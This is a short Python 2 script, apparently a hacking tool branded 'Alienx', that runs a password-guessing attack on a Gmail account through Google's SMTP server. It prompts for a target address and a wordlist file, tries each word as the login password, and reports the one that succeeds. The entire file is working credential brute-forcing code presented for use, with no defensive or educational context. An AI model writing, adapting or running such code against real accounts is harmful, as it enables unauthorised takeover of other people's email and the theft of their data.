#!/bin/python2
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("\033[4mAlienx\033[0m set(\033[32musername/gmail\033[0m) > ")
passswfile= raw_input("\033[4mAlienx\033[0m set(\033[32mbrute/passwd/dir\033[0m) > ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print "\033[92m Password found: \033[0m %s" % (password)
        break

    except smtplib.SMTPAuthenticationError:
        print "Trying Password : failed \033[91m%s\033[0m " % (password)
